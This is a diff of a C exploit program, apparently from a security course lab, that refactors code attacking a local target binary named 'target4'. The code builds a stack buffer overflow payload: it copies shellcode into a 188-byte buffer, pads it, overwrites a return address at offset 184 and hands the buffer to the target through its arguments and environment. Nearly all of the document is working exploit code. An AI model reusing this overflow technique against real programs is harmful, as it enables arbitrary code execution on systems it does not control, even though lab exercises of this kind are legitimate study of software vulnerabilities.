@@ -5,17 +5,16 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target4"
+#define BUFFER_SIZE 188
 
-int main(void)
-{
+int main(void) {
 	char *args[3];
 	char *env[6];
-
-	args[0] = TARGET; 
-	char exploit[188];
+	char exploit[BUFFER_SIZE];
 	int i = 0;
+
 	strcpy(exploit, shellcode);
-	for (i = 45; i < 188; i++) {
+	for (i = 45; i < BUFFER_SIZE; i++) {
 		exploit[i] = 0x01;
 	}
 	exploit[168] = 0xBB; // 187
@@ -30,6 +29,7 @@ int main(void)
 	int* ret_in_exploit = (int*) (exploit + 184);
 	*ret_in_exploit = return_add;	
 	
+	args[0] = TARGET;	
 	args[1] = exploit;
 	args[2] = NULL;
 	env[0] = &exploit[170];
